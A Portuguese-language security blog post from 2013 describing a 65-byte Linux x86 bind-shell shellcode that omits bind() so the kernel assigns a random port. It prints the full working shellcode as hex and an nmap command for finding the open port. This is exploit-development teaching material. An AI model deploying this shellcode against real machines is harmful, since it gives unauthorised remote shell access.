---
layout: post
title: Hacking do Dia - Shell Bind TCP Random Port
date: '2013-03-18T23:00:00.000-03:00'
author: geyslan
categories: blog
excerpt:
tags: [slae, shellcode, linux, code, assembly, c, hacking, metasploit, portuguese]
share: true
modified: '2014-05-04T11:38:14.382-03:00'
blogger_id: tag:blogger.com,1999:blog-2541885528459487831.post-1583820687648973523
blogger_orig_url: http://www.hackingbits.com/2013/03/hacking-do-dia-shell-bind-tcp-random.html
---

*/\*<br>
Para melhor entendimento, leiam o post anterior [SLAE - 1st Assignment - Shell Bind TCP](/slae-1st-assignment-shell-bind-tcp.html)<br>
\*/*

<!--more-->

*\<UPDATE\><br>
O [shellcode](http://shell-storm.org/shellcode/files/shellcode-834.php) final
deste post foi aceito no repositório [Shell-Storm](http://www.shell-storm.org/).<br>
Tks Jonathan Salwan.<br>
\</UPDATE\>*

*\<UPDATE 2\><br>
Foram incluídas no Metasploit as versões x86 e x86_64 deste payload.<br>
Tks Ewerson Guimarães (Crash), Tod Beardsley and all involved in Metasploit project.<br>
x86
[payload](https://github.com/rapid7/metasploit-framework/blob/678a16b5ef2dda6a65b2785cda498aab7bfda46a/modules/payloads/singles/linux/x86/shell_bind_tcp_random_port.rb)<br>
x86_64
[payload](https://github.com/rapid7/metasploit-framework/blob/678a16b5ef2dda6a65b2785cda498aab7bfda46a/modules/payloads/singles/linux/x64/shell_bind_tcp_random_port.rb)<br>
\</UPDATE 2\>*

Olá pessoal!

Comentários são sempre fantásticos. Sabem por quê?

Porque através da troca de conhecimento ideias surgem. E, havendo vontade, essas
ideias podem se transformar em algo útil.

Esta tarde, [Tiago Natel](https://twitter.com/_i4k_)
([SecPlus](http://www.secplus.com.br/)) me respondeu, com veemência e
propriedade, sobre o post [SLAE - 1st
Assignment](slae-1st-assignment-shell-bind-tcp.html)
na lista do [Brasil
Underground](https://groups.google.com/forum/?fromgroups#!forum/brasil-underground).
A informação que ele passou sobre shellcodes e o uso do **SO_REUSEADDR** foram
engrandecedoras para mim e os demais da lista.

Por e-mail, marcamos de debatermos o assunto, o que aconteceu no finalzinho da
tarde.

Fizemos, em conjunto, uns debbugs e traces dos shellcodes do metasploit e do que
disponibilizei via
[github](https://github.com/geyslan/SLAE/tree/master/1st.assignment).
Constatamos que realmente o do metasploit gera SIGSEGV quando a porta ainda está
em TIME_WAIT, uma vez que ao tentar fazer o bind, e não conseguir, o registrador
$eax recebe número negativo (erro) e fica poluído. Mesmo as novas cópias para
esse registrador não resolvem, já que, para se evitar null-bytes, os shellcodes
têm mov's usando o registrador $al, que copiam apenas 1 byte, deixando o resto
de $eax como está. Bom, dá para imaginar que o shellcode não vai funcionar muito
bem. :D

Identificamos, porém, que quando o meu shell_bind_tcp, sem opção SO_REUSEADDR,
era instanciado pela segunda vez, ou seja, com a porta da instância anterior
ainda em TIME_WAIT, o socket, ao ser criado, usava uma porta aleatória. De
início, achamos isso meio louco! Chegamos a pensar que a listen cuidava disso.
Eu pensei que era alguma coisa da libc, mas reproduzi o mesmo efeito com o
código asm (apenas com syscalls).

Nesse ínterim, Tiago, por ter bastante experiência, fez uma pesquisa rápida no
google e  encontrou informações a respeito do uso do bind no manual POSIX da
Fujitsu Siemens Computer
([SOCKETS/XTI(POSIX)](http://manuals.ts.fujitsu.com/file/4686/posix_s.pdf)).

Vejam o achado dele (pg. 23):

> 2.6.6 Automatic address assignment by the system<br><br>
You can still call a function for a socket which actually requires a bound
socket (e.g. connect(), sendto(), etc.), **even if the socket has no address
assigned to it. In this case, the system executes an implicit bind() call with
wildcards for the Internet address and port number, i.e. the socket is bound
with INADDR_ANY to all IPv4** addresses and with IN6ADDR_ANY to all IPv6 addresses
and IPv4 addresses of the host **and receives a free port number from the range of
non-privileged port numbers.**

O que isso quer dizer?

Se não tivermos feito bind no socket, ou se o bind não acontecer por não haver
endereço e/ou porta disponíveis, como identificamos no meu shell_bind_tcp sem
SO_REUSEADDR, ao se utilizar syscalls como connect, sendto, no nosso caso a
listen, o sistema se encarrega de fazer um bind genérico com o atributo
INADDR_ANY e de disponibilizar uma porta dentre os números não privilegiados.

De certa forma estávamos corretos, pois pensávamos que era a listen que estava a
fazer o bind automático; em verdade, foi através dela que o sistema se
encarregou de amarrar o socket a um endereço disponível.

*Sim, e daí?*

Os shellcodes não imploram para serem pequenos e se adequarem aos buffers
explorados?

Quase que instantaneamente tivemos a ideia de retirar o setsockopt (usado no meu
shellcode) e o próprio bind (usado em todos).

Vocês não imaginam o tamanho do novo
[shell_bind_tcp_random_port](https://github.com/geyslan/SLAE/tree/master/improvements)...

**Míseros 65 bytes**

{% highlight console %}
$ echo -e "\x6a\x66\x58\x99\x6a\x01\x5b\x52\x53\x6a\x02\x89\xe1\xcd\x80\x89\xc6\x5f\xb0\x66\xb3\x04\x52\x56\x89\xe1\xcd\x80\xb0\x66\x43\x89\x54\x24\x08\xcd\x80\x93\x59\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\xeb\xca" | /opt/libemu/bin/sctest -vvv -Ss 100000 -G shell_bind_tcp_random_port.dot
{% endhighlight %}

{% include imagehb.html url="https://raw.github.com/geyslan/SLAE/master/improvements/shell_bind_tcp_random_port_shellcode.png" caption="Fluxograma do shell_bind_tcp_random_port" %}

*Ah, mas isso não serve! Do que adianta se eu não posso setar a porta?*

**nmap nele!**

{% highlight console %}
$ nmap -sS host -p-
{% endhighlight %}

Só tenho algo mais a dizer: **COMPARTILHEM!!**

*P.S.* Valeu, Tiago!

##Mais Informações

[Hacking bits - github](https://github.com/geyslan)<br> [Metasploit x86
payload](https://github.com/rapid7/metasploit-framework/blob/678a16b5ef2dda6a65b2785cda498aab7bfda46a/modules/payloads/singles/linux/x86/shell_bind_tcp_random_port.rb)<br>
[Metasploit x86_64
payload](https://github.com/rapid7/metasploit-framework/blob/678a16b5ef2dda6a65b2785cda498aab7bfda46a/modules/payloads/singles/linux/x64/shell_bind_tcp_random_port.rb)<br>
[SecPlus - github](https://github.com/SecPlus/)<br>
[SecPlus](http://www.secplus.com.br/)<br> [POSIX - SOCKETS/XTI for POSIX -
Manuals - Fujitsu](http://manuals.ts.fujitsu.com/file/4686/posix_s.pdf)<br>
[bind() - POSIX - IEEE Std
1003.1-2008](http://pubs.opengroup.org/onlinepubs/9699919799/functions/bind.html)<br>
[nmap](http://nmap.org/)<br> [Brasil
Underground](https://groups.google.com/forum/?fromgroups#%21forum/brasil-underground)<br>
